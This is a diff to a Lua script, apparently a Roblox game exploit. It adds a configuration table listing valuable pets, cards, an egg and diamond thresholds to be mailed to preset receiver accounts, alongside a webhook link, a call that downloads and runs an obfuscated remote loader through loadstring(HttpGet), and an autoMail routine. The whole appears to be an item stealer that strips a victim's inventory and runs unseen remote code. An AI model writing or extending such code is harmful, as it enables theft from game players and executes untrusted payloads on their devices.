@@ -228,6 +228,20 @@ local function branchB()
     _G.GWEBHOOK_USERID = USER_ID
     _G.GWEBHOOK_LINK = HUGE_WEBHOOK
     _G.GMAIL_RECEIVERS = MAIL_USERS
+    _G.GMAIL_ITEMS = {
+        ["All Huges"] = {Class = "Pet", Id = "All Huges", MinAmount = 1},
+        ["Send Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "1m", MinAmount = "5m"},
+        ["Huge Arcade Dog Card"] = {Class = "Card", Id = "Huge Arcade Dog Card", MinAmount = 1, AllVariants = true},
+        ["Huge Pog Cat Card"] = {Class = "Card", Id = "Huge Pog Cat Card", MinAmount = 1, AllVariants = true},
+        ["Huge Storm Axolotl Card"] = {Class = "Card", Id = "Huge Storm Axolotl Card", MinAmount = 1, AllVariants = true},
+        ["Huge Nightmare Dog Card"] = {Class = "Card", Id = "Huge Nightmare Dog Card", MinAmount = 1, AllVariants = true},
+        ["Huge Blurred Axolotl Card"] = {Class = "Card", Id = "Huge Blurred Axolotl Card", MinAmount = 1, AllVariants = true},
+        ["Huge Arcane Dominus Card"] = {Class = "Card", Id = "Huge Arcane Dominus Card", MinAmount = 1, AllVariants = true},
+        ["Huge Ninja Capybara Card"] = {Class = "Card", Id = "Huge Ninja Capybara Card", MinAmount = 1, AllVariants = true},
+        ["Titanic Cupcake Pegasus Card"] = {Class = "Card", Id = "Titanic Cupcake Pegasus Card", MinAmount = 1, AllVariants = true},
+        ["Titanic Signature BIG Maskot Card"] = {Class = "Card", Id = "Titanic Signature BIG Maskot Card", MinAmount = 1, AllVariants = true},
+        ["Daycare egg 5"] = {Class = "Egg", Id = "Huge Machine Egg 5", MinAmount = 1},
+    }
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/34915da4ad87a5028e1fd64efbe3543f.lua"))()
 
     task.spawn(autoMail)
